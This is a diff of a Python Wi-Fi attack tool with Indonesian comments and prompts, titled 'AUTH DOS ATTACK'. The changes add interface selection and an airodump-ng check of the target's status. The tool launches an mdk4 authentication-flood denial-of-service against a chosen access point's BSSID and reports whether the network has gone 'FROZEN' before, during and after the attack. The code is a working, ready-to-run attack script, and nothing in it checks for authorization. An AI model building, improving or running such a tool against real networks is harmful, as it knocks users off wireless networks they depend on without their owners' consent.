@@ -270,18 +270,6 @@ def stop_monitor_mode(monitor_iface):
 
     run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
 
-def get_monitor_interface():
-    ifaces = get_wireless_interfaces()
-    for iface in ifaces:
-        if iface.endswith("mon"):
-            return iface
-    
-    for iface in ifaces:
-        if iface.startswith("wlan"):
-            return start_monitor_mode(iface)
-    
-    return start_monitor_mode("wlan0")
-
 def get_power_status(power):
     if power == "N/A":
         return "N/A", GRAY
@@ -298,7 +286,77 @@ def get_power_status(power):
     except ValueError:
         return "N/A", GRAY
 
+def check_target_status(bssid, channel, monitor_iface, duration=3):
+    """Cek status target dengan airodump-ng selama beberapa detik"""
+    temp_dir = tempfile.mkdtemp(prefix="airodump-status-", dir="/tmp")
+    prefix = os.path.join(temp_dir, "status")
+    
+    proc = subprocess.Popen(
+        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "--write", prefix, "--output-format", "csv", monitor_iface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    
+    time.sleep(duration)
+    
+    proc.terminate()
+    try:
+        proc.wait(timeout=3)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        proc.wait()
+    
+    # Cek apakah ada data dari target
+    found = False
+    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
+        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
+            reader = csv.reader(handle)
+            for row in reader:
+                if len(row) > 0 and bssid in row[0]:
+                    found = True
+                    break
+        if found:
+            break
+    
+    # Bersihkan file
+    for path in glob.glob(prefix + "-*.csv"):
+        try:
+            os.remove(path)
+        except OSError:
+            pass
+    try:
+        os.rmdir(temp_dir)
+    except OSError:
+        pass
+    
+    return found
+
 # ================= SELECT FUNCTIONS =================
+
+def select_interface():
+    clear_screen()
+    draw_box_top(CYAN)
+    draw_box_title("AUTH DOS ATTACK", CYAN, YELLOW)
+    draw_box_bottom(CYAN)
+    
+    loading("Scanning interfaces...", 1)
+    ifaces = get_wireless_interfaces()
+    if not ifaces:
+        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
+        sys.exit(1)
+
+    print(f"\n  {BOLD}Pilih interface:{RESET}")
+    for idx, name in enumerate(ifaces, start=1):
+        print(f"  {GREEN}{idx}.{RESET} {name}")
+
+    while True:
+        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
+        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+            selected = ifaces[int(choice) - 1]
+            glitch_print(f"LOCKED: {selected}", CYAN)
+            time.sleep(0.3)
+            return selected
+        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")
 
 def select_target(networks):
     if not networks:
@@ -371,6 +429,15 @@ def run_attack(target, monitor_iface):
     print(f"  {CYAN}[*] Channel: {target['channel']}{RESET}")
     print(f"  {YELLOW}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
     
+    # Cek status awal target
+    print(f"  {YELLOW}[*] Mengecek status target...{RESET}")
+    awal_status = check_target_status(target['bssid'], target['channel'], monitor_iface, 3)
+    
+    if awal_status:
+        print(f"  {GREEN}[✓] Target terdeteksi - Status: SEHAT{RESET}\n")
+    else:
+        print(f"  {RED}[✗] Target tidak terdeteksi - Mungkin sudah OFFLINE{RESET}\n")
+    
     # Jalankan airodump-ng di background
     dump_cmd = [
         "sudo", "airodump-ng",
@@ -382,27 +449,66 @@ def run_attack(target, monitor_iface):
     dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
     
-    # Jalankan mdk4 auth dos - OUTPUT TETAP DITAMPILKAN
+    # Jalankan mdk4 auth dos
     mdk4_cmd = [
         "sudo", "mdk4", monitor_iface, "a",
         "-a", target["bssid"],
         "-s", "1000"
     ]
     
-    print(f"  {YELLOW}Command: {' '.join(mdk4_cmd)}{RESET}\n")
+    print(f"  {YELLOW}Command: {' '.join(mdk4_cmd)}{RESET}")
+    print(f"  {GRAY}{'=' * 50}{RESET}\n")
     
+    attack_running = True
     try:
-        # Popen dengan stdout dan stderr ke terminal (biar outputnya keliatan)
-        proc = subprocess.Popen(mdk4_cmd)
-        proc.wait()
+        # Jalankan MDK4 di background
+        mdk4_proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Loop monitoring status
+        last_status = awal_status
+        status_unchanged_count = 0
+        
+        while attack_running and mdk4_proc.poll() is None:
+            # Cek status setiap 5 detik
+            time.sleep(5)
+            
+            current_status = check_target_status(target['bssid'], target['channel'], monitor_iface, 2)
+            
+            # Tampilkan status
+            if current_status:
+                if last_status != current_status:
+                    print(f"\n  {GREEN}[✓] STATUS: SEHAT (Target masih merespon){RESET}")
+                    last_status = current_status
+                    status_unchanged_count = 0
+                else:
+                    status_unchanged_count += 1
+                    # Tampilkan status periodik
+                    if status_unchanged_count % 2 == 0:
+                        print(f"\n  {GREEN}[✓] STATUS: SEHAT (Target masih aktif){RESET}")
+            else:
+                if last_status != current_status:
+                    print(f"\n  {RED}🔥🔥🔥 STATUS: FROZEN 🔥🔥🔥{RESET}")
+                    print(f"  {RED}[!] Target tidak merespon - Jaringan kemungkinan FROZEN!{RESET}")
+                    last_status = current_status
+                    status_unchanged_count = 0
+                else:
+                    status_unchanged_count += 1
+                    if status_unchanged_count % 2 == 0:
+                        print(f"\n  {RED}🔥 STATUS: FROZEN (Target masih tidak merespon){RESET}")
+            
+            # Jika status berubah dari SEHAT ke FROZEN, kasih notif
+            if last_status == False and current_status == False and status_unchanged_count > 0:
+                pass  # Sudah tampil di atas
+            
     except KeyboardInterrupt:
         print(f"\n  {YELLOW}[!] Menghentikan serangan...{RESET}")
-        proc.terminate()
-        try:
-            proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            proc.wait()
+        if 'mdk4_proc' in locals() and mdk4_proc.poll() is None:
+            mdk4_proc.terminate()
+            try:
+                mdk4_proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                mdk4_proc.kill()
+                mdk4_proc.wait()
         print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
     finally:
         if dump_proc.poll() is None:
@@ -412,6 +518,14 @@ def run_attack(target, monitor_iface):
             except subprocess.TimeoutExpired:
                 dump_proc.kill()
                 dump_proc.wait()
+        
+        # Status akhir
+        print(f"\n  {YELLOW}[*] Status akhir target:{RESET}")
+        akhir_status = check_target_status(target['bssid'], target['channel'], monitor_iface, 3)
+        if akhir_status:
+            print(f"  {GREEN}[✓] Target masih SEHAT{RESET}")
+        else:
+            print(f"  {RED}🔥 Target FROZEN / OFFLINE 🔥{RESET}")
 
 def prompt_post_attack():
     print(f"\n  {BOLD}Pilih opsi:{RESET}")
@@ -456,16 +570,9 @@ def main():
     
     while True:
         try:
-            if monitor_iface is None:
-                clear_screen()
-                draw_box_top(CYAN)
-                draw_box_title("AUTH DOS ATTACK", CYAN, YELLOW)
-                draw_box_bottom(CYAN)
-                
-                print(f"\n  {YELLOW}[*] Mencari interface monitor...{RESET}")
-                monitor_iface = get_monitor_interface()
-                glitch_print(f"MONITOR INTERFACE: {monitor_iface}", CYAN)
-                time.sleep(0.5)
+            # Pilih interface dulu
+            adapter = select_interface()
+            monitor_iface = start_monitor_mode(adapter)
             
             # Scan duration
             clear_screen()
